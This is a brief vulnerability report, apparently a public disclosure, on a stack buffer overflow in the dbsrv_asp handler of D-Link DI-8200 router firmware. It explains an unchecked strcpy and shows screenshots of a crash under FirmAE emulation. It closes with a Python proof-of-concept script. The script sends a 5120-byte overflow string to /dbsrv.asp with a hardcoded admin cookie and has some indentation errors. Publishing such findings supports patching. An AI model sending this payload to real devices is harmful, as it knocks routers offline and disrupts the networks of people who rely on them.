Firmware version:

DI_8200-16.07.26A1
	
Download address:

http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8200

buffer overflow:
dbsrv_asp function has a buffer overflow；v32 length 1200，a1 is the passed parameter，v3 is the value of str，The length is not judged when the strcpy function is executed，This results in an overflow；

![Pasted image 20240808182053](https://github.com/user-attachments/assets/1f359793-53cc-4cae-898c-2bb942af260b)

![Pasted image 20240808181937](https://github.com/user-attachments/assets/63adf1c5-c77b-44fc-a05c-d9b389e9a96c)

![Pasted image 20240808182027](https://github.com/user-attachments/assets/696dd1c3-a0b2-41bb-a02a-8fa4d352b6e3)

FirmAE simulates the firmware overflow process, which eventually causes the program crash page to be inaccessible;

![763b646e75e80fa8437067a478f1836](https://github.com/user-attachments/assets/7d9fbf6d-6e0e-4a70-a46b-44eaf3d81c77)

![3082963502cf0d16241f9d323881892](https://github.com/user-attachments/assets/4c32b65c-d923-4c3b-819e-b57bd0a78727)

![75dfe072da35cfe4dd94491a7bb04b6](https://github.com/user-attachments/assets/ed2979e6-c664-48fa-b39b-eea37628d7a9)


POC：

```
import requests
from pwn import *
    
target_ip = "192.168.0.1"
target_port = 80
  
payload = b'a'*5120
 
url = f"http://{target_ip}/dbsrv.asp?"
 
cookie = {"wys_userid": "admin,wys_passwd=861A198CDBD425F0B9D91C42FAB93A86"}
 
headers = {
    "Accept": "application/json, text/javascript, */*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.3    6",
    "Referer": "http://192.168.0.1/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh,en-US;q=0.9,en;q=0.8",
    "Connection": "close"
  }
  
  params = {
      "str":{payload}
  }
 
  requests.get(url, params=params, cookies=cookie)
```
